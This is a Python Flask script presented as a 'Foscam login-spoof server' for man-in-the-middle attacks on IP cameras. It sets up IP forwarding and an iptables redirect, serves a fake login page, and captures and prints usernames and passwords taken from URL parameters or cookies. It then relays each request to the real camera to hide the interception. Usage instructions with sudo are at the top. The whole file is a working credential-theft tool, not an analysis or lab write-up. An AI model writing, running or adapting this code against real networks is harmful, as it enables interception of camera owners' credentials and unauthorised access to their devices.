#!/usr/bin/env python3

# IMPORTANT:
# To run the script:
# 1. Open terminal
# 2. Navigate to the directory containing this script
# 3. Type in the command: sudo python3 http_spoof_server.py --camera 192.168.0.5 --port 88 --iface <your-interface>
"""
http_spoof_server.py

A Flask app that:
- Sets up and tears down iptables redirection rules automatically.
- Serves your index.html (and any static/ assets) for all browser GETs.
- Intercepts GETs to /cgi-bin/CGIProxy.fcgi?cmd=login&usr=…&pwd=…
  → logs the credentials (from URL params OR cookies), forwards to real camera, and returns camera’s response.
Usage: sudo python3 http_spoof_server.py --camera CAMERA_IP --port PORT --iface IFACE
"""

import argparse
import os
import subprocess
import sys
from flask import Flask, request, send_from_directory, Response
import requests

app = Flask(__name__, static_folder="static", static_url_path="/static")

# These globals are set via CLI args below:
CAMERA_IP   = None
CAMERA_PORT = 88
INTERFACE   = None
FLASK_PORT  = 88 # The port our fake server runs on

def setup_forwarding(enable=True):
    """Enable or disable kernel IP forwarding and set up iptables redirection."""
    action = "Enabling" if enable else "Disabling"
    print(f"[+] {action} IP forwarding and firewall rules...")

    try:
        # Enable/Disable IP Forwarding
        subprocess.run(
            ["sysctl", "-w", f"net.ipv4.ip_forward={'1' if enable else '0'}"],
            check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE
        )

        # Add or Delete the iptables rule
        iptables_action = "-A" if enable else "-D"
        subprocess.run(
            [
                "iptables", "-t", "nat", iptables_action, "PREROUTING",
                "-i", INTERFACE,
                "-p", "tcp",
                "-d", CAMERA_IP,
                "--dport", str(CAMERA_PORT),
                "-j", "REDIRECT",
                "--to-port", str(FLASK_PORT)
            ],
            check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE
        )
        status = "set" if enable else "removed"
        print(f"[+] IP forwarding and firewall rules {status}.")
    except subprocess.CalledProcessError as e:
        print(f"[!] Failed to set up forwarding rules: {e.stderr.decode().strip()}", file=sys.stderr)
        sys.exit(1)
    except FileNotFoundError:
        print("[!] `iptables` or `sysctl` command not found. Please ensure they are installed and in your PATH.", file=sys.stderr)
        sys.exit(1)


@app.route('/', methods=['GET'])
@app.route('/<path:filepath>', methods=['GET'])
def serve_index_or_static(filepath=""):
    """
    For any GET path:
    - If it begins with "cgi-bin/CGIProxy.fcgi", divert to proxy_cgi().
    - Else, if a file named filepath exists under static/, serve it.
    - Otherwise, fall back to static/index.html.
    """
    if filepath.startswith("cgi-bin/CGIProxy.fcgi"):
        return proxy_cgi()

    if filepath:
        full_path = os.path.join(app.static_folder, filepath)
        if os.path.isfile(full_path):
            return send_from_directory(app.static_folder, filepath)
    return send_from_directory(app.static_folder, "index.html")

@app.route('/login.css', methods=['GET'])
def proxy_cgi():
    """
    Catch all /cgi-bin/CGIProxy.fcgi?… calls.
    If cmd=login, capture usr/pwd; forward the same request to the real camera;
    return the camera’s response unchanged.
    """
    # First, try to get credentials from URL parameters
    cmd = request.args.get("cmd", "")
    usr = request.args.get("usr", "")
    pwd = request.args.get("pwd", "")

    # If not found in URL, check for them in the cookies
    if not usr:
        usr = request.cookies.get("username")
    if not pwd:
        pwd = request.cookies.get("password")
    if not cmd and (usr and pwd):
        cmd = "login"

    # If it’s a login attempt, print the credentials
    if cmd == "login" and usr and pwd:
        print("\n---------------------------------------------------------")
        print(f"[+] Captured credentials → Username: '{usr}' | Password: '{pwd}'")
        print("---------------------------------------------------------\n")

    # Build the real camera’s CGI URL
    camera_url = f"http://{CAMERA_IP}:{CAMERA_PORT}/cgi-bin/CGIProxy.fcgi"
    try:
        # Forward the identical query string and cookies to the real camera
        resp = requests.get(camera_url, params=request.args, cookies=request.cookies, timeout=5)
        return Response(
            resp.content,
            status=resp.status_code,
            content_type=resp.headers.get("Content-Type", "application/octet-stream")
        )
    except requests.exceptions.RequestException as e:
        print(f"[!] Error forwarding to real camera: {e}")
        return Response("", status=502, content_type="text/html")


def parse_args():
    parser = argparse.ArgumentParser(
        description="Foscam login‐spoof server with automated iptables management.",
        formatter_class=argparse.RawTextHelpFormatter
    )
    parser.add_argument("--camera", required=True, help="IP address of real Foscam camera (e.g. 192.168.0.5)")
    parser.add_argument("--port", type=int, default=88, help="Port of real camera’s HTTP interface (default: 88)")
    parser.add_argument("--iface", required=True, help="Network interface used for MITM (e.g. eth0)")
    return parser.parse_args()


if __name__ == "__main__":
    if os.geteuid() != 0:
        print("[!] This script requires root privileges to manage iptables and bind to port 88.", file=sys.stderr)
        sys.exit(1)

    args = parse_args()
    CAMERA_IP   = args.camera
    CAMERA_PORT = args.port
    INTERFACE   = args.iface

    try:
        # Set up forwarding rules before starting the app
        setup_forwarding(enable=True)
        # Run Flask on 0.0.0.0 (root required to bind to privileged ports)
        app.run(host="0.0.0.0", port=FLASK_PORT, debug=True)
    finally:
        # This block will run when the app is shut down (e.g., Ctrl+C)
        setup_forwarding(enable=False)